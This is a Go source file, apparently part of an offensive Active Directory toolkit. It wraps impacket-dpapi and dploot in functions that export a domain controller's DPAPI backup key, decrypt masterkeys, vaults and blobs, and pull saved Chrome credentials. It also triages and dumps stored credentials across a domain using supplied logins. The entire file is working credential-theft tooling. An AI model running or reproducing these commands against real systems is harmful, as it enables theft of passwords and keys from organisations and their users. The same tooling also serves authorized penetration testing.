package modules

import (
	"adpack/utils"
	"fmt"
)

type DPAPIManager struct{}

func (d *DPAPIManager) BackupKey(dcIP, user, pass, domain string) error {
	args := []string{"backupkeys", "-t", dcIP, "--export"}
	if user != "" {
		args = append(args, "-u", fmt.Sprintf("%s/%s", domain, user), "-p", pass)
	}
	utils.Step("Extracting domain backup key...")
	result := utils.RunCommand("impacket-dpapi", args...)
	if !result.Success {
		return fmt.Errorf("dpapi backupkeys failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (d *DPAPIManager) MasterKey(file, pvk string) error {
	utils.Step(fmt.Sprintf("Decrypting masterkey: %s...", file))
	result := utils.RunCommand("impacket-dpapi", "masterkey", "-file", file, "-pvk", pvk)
	if !result.Success {
		return fmt.Errorf("dpapi masterkey failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (d *DPAPIManager) Blob(file, key string) error {
	utils.Step(fmt.Sprintf("Decrypting blob: %s...", file))
	result := utils.RunCommand("impacket-dpapi", "blob", "-file", file, "-key", key)
	if !result.Success {
		return fmt.Errorf("dpapi blob failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (d *DPAPIManager) Vault(file, key string) error {
	utils.Step(fmt.Sprintf("Decrypting vault: %s...", file))
	result := utils.RunCommand("impacket-dpapi", "vault", "-file", file, "-key", key)
	if !result.Success {
		return fmt.Errorf("dpapi vault failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (d *DPAPIManager) Chrome(state, key string) error {
	utils.Step(fmt.Sprintf("Decrypting Chrome creds: %s...", state))
	result := utils.RunCommand("impacket-dpapi", "chrome", "-state", state, "-key", key)
	if !result.Success {
		return fmt.Errorf("dpapi chrome failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (d *DPAPIManager) Triage(dcIP, user, pass, domain string) error {
	args := []string{"-u", fmt.Sprintf("%s/%s", domain, user), "-p", pass, dcIP, "triage"}
	utils.Step("Running dploot triage...")
	result := utils.RunCommand("dploot", args...)
	if !result.Success {
		return fmt.Errorf("dploot triage failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (d *DPAPIManager) Credentials(dcIP, user, pass, domain string) error {
	args := []string{"-u", fmt.Sprintf("%s/%s", domain, user), "-p", pass, dcIP, "credentials"}
	utils.Step("Running dploot credentials...")
	result := utils.RunCommand("dploot", args...)
	if !result.Success {
		return fmt.Errorf("dploot credentials failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}
